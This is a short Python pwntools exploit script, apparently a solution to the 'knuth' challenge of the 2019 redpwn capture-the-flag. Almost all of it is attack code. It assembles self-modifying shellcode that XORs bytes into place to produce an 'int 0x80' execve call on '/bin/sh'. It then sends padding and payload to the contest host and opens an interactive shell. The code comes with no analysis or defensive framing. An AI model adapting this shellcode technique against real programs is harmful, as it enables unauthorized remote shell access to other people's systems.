from pwn import *


padding = b'q\x20'+b'aaaaaaaaaaaaaaaaaaaaaaa/bin/shaa'
payload  = asm('''
                push eax
                push eax
                pop ecx     #Set ecx to start of deleted note
                pop ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                inc ebx
                push 0x41
                pop eax
                xor al, 0x41
                push eax
                pop edx
                dec eax     #eax = 0xffffffff
                xor [ecx+0x63],al   #Craft `int` (0xcd)
                xor al, 0x39
                xor [ecx+0x64],al   #Craft  `0x80`
                push 0x61
                pop eax
                xor [ecx+0x20],al   #Craft  `0x00`
                push 0x41
                pop eax
                xor al,0x41
                push eax
                pop ecx
                push eax
                pop esi
                push 0x2b
                pop eax
                xor al,0x20         #eax = 11
                ''')+b'\x32\x46'
print(hex(len(padding+payload)))
print(payload)

r = remote('chall.2019.redpwn.net',4009)
#r = process('knuth')
#input()
r.send(padding+payload)
r.interactive()
